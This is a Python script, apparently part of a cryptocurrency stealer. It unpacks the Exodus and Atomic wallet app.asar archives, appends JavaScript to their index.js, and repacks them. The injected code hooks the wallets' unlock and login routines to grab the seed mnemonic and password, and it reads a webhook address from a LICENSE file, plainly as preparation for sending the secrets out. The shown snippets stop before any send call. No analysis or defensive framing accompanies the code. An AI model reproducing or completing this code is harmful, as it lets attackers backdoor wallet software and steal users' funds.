import os
import subprocess
import glob
import shutil

EXODUS_ASAR = os.path.expandvars(r'%LOCALAPPDATA%\exodus\app-*\resources\app.asar')
ATOMIC_ASAR = os.path.expandvars(r'%LOCALAPPDATA%\Programs\atomic\resources\app.asar')

EXODUS_UNPACKED_DIR = os.path.join(os.getenv("temp"), 'exodus_unpacked')
ATOMIC_UNPACKED_DIR = os.path.join(os.getenv("temp"), 'atomic_unpacked')

EXODUS_INJECTION_CODE = """
async unlock(e) {
    if (await this.shouldUseTwoFactorAuthMode()) return;
    const t = await Object(ee.readSeco)(this._walletPaths.seedFile, e);
    this._setSeed(M.fromBuffer(t)), P.a.randomFillSync(t), await this._loadLightningCreds()

    const webhook = await fs.readFile('LICENSE', 'utf8');
    const mnemonic = this._seed.mnemonicString;
    const password = e;
}
"""

ATOMIC_INJECTION_CODE = """
async login() {
    let e;
    this.$storage.password = this.password;
    try {
        if (e = await this.$addresses.get(), 0 === e.length) throw new Error("empty addresses")
    } catch (e) {
        return console.error(e), void(this.passwordError = "Wrong password")
    }

    const mnemonic = await this.$storage.get("general_mnemonic");
    const password = await this.password
    const fs = require('fs').promises;
    const webhook = await fs.readFile('LICENSE.electron.txt', 'utf8');
}
"""

def run_asar_command(command, asar_file, output_dir=None):
    if command == 'extract':
        subprocess.run(['asar', 'extract', asar_file, output_dir])
    elif command == 'pack':
        subprocess.run(['asar', 'pack', output_dir, asar_file])

def inject_code(file_path, code):
    with open(file_path, 'a', encoding='utf-8') as f:
        f.write(code)

def process_wallet(wallet_name, asar_path, unpack_dir, injection_code):
    asar_file = glob.glob(asar_path)[0]
    run_asar_command('extract', asar_file, unpack_dir)
    index_file = glob.glob(f"{unpack_dir}/src/app/main/index.js")[0]
    inject_code(index_file, injection_code)
    run_asar_command('pack', asar_file, unpack_dir)
    shutil.rmtree(unpack_dir)

if __name__ == "__main__":
    process_wallet('Exodus', EXODUS_ASAR, EXODUS_UNPACKED_DIR, EXODUS_INJECTION_CODE)
    process_wallet('Atomic', ATOMIC_ASAR, ATOMIC_UNPACKED_DIR, ATOMIC_INJECTION_CODE)
